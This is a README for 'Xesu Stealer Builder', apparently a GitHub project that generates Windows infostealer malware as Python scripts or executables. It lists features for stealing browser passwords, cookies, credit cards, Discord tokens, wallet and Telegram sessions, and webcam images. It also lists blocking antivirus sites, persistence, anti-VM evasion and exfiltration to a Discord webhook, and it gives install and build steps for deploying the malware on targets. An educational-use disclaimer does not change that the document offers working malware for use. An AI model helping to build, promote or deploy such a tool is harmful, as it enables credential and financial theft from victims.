# Xesu Stealer Builder

## Overview

Xesu Stealer Builder is a graphical user interface (GUI) application designed for creating customizable data extraction and system manipulation tools targeted at Windows environments. It allows users to configure various stealer and malware functionalities, integrate a Discord webhook for data exfiltration, and build the output as either a Python script or a standalone executable (.exe) file. The tool supports features like browser data theft, token grabbing, screenshot capture, and disruptive actions such as input blocking or system shutdown.

**Note:** This tool is intended for educational and research purposes only, such as cybersecurity analysis or penetration testing in controlled environments. Misuse for unauthorized data collection, system disruption, or any illegal activities is strictly prohibited and may violate laws like the Computer Fraud and Abuse Act (CFAA) or equivalent regulations in your jurisdiction. The developers assume no liability for any misuse.

## Features

### Stealer Options
- **System Information:** Collects details like hostname, OS version, processor, and architecture.
- **Browser Data Extraction:** Supports Chrome, Edge, Opera, and Brave browsers for stealing passwords, cookies, browsing history, download history, and credit card details.
- **Discord Tokens:** Extracts up to 5 MFA-protected tokens from local storage.
- **Discord Injection:** Simulates injection status (enabled/disabled).
- **Roblox Accounts:** Retrieves usernames from Roblox configuration files.
- **Wallets, Games, and Apps:** Session file extraction for wallets, game launchers (e.g., Steam/Epic), and apps like Telegram.
- **Extensions and Interesting Files:** Scans for browser extensions and user-defined interesting files.
- **Media Capture:** Takes webcam shots and screenshots, encoding them in Base64 for transmission.

### Malware Options
- **Input Blocking:** Blocks keyboard, mouse, or Task Manager access.
- **Website Blocking:** Restricts access to antivirus sites (e.g., VirusTotal).
- **System Disruption:** Initiates shutdown, restart (every 5 minutes if enabled), or spams program openings/files.
- **Fake Errors:** Displays custom error messages via Windows message boxes.
- **Persistence:** Adds the tool to startup for automatic execution on boot.
- **Anti-VM/Debug:** Detects virtual machines (e.g., VMware, VirtualBox) and exits if found.

### Builder Features
- **Webhook Integration:** Sends collected data to a specified Discord webhook.
- **Output Formats:** Generate as a `.py` script or `.exe` executable (using PyInstaller).
- **Custom Icons:** Option to add a custom `.ico` icon for executables.
- **Validation:** Built-in webhook testing and error logging.

## Requirements

- Python 3.8+ (tested on Windows).
- Dependencies listed in `requirements.txt` (install via `pip install -r requirements.txt`).
- For building executables: PyInstaller must be installed.
- Administrator privileges may be required for certain features (e.g., registry modifications).

## Installation

1. Clone or download the repository:
   ```bash
   git clone https://github.com/PapaSmurf6945/Xesu-Stealer.git
   cd Xesu-Stealer
   ```

2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

3. Ensure all required modules are available. If any are missing, the script will prompt for installation.

## Usage

1. Run the builder:
   ```bash
   python xesu_builder.py
   ```

2. In the GUI:
   - Enter a valid Discord webhook URL.
   - Test the webhook to ensure it's functional.
   - Select stealer and malware options via checkboxes.
   - If enabling "Fake Error," configure the title and message in the popup.
   - Choose a file name, output type (Python File or Exe File), and optional icon.
   - Click "Build" to generate the file in the `Output/XesuBuilder` directory.

3. The built tool, when executed on a target Windows system, will collect configured data, perform actions, and send results to the webhook.

### Example Output
- A successful build logs options to the console and opens the output directory.
- Webhook payloads include embeds with stolen data, system info, and status updates.

## Configuration Notes
- **Webhook:** Must be a valid Discord webhook; invalid ones will prevent building.
- **File Types:** Python files are source code; EXE files are standalone but larger.
- **Icon Path:** Only `.ico` files are supported for EXE builds.
- **Limitations:** Works only on Windows. Some features (e.g., webcam) require hardware access.

## Troubleshooting
- **Module Errors:** Ensure all dependencies are installed. Run with administrative rights if needed.
- **Build Failures:** Check PyInstaller logs for issues like missing icons or path errors.
- **Webhook Issues:** Verify the URL and Discord server permissions.
- **VM Detection:** If anti-VM is enabled, the tool may exit in virtual environments.

## Contributing
Contributions are welcome for bug fixes or feature enhancements. Please submit pull requests or issues on the GitHub repository.

## License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Disclaimer
This software is provided "as is" without warranty of any kind. Use responsibly and ethically. The authors are not responsible for any damage, data loss, or legal consequences arising from its use.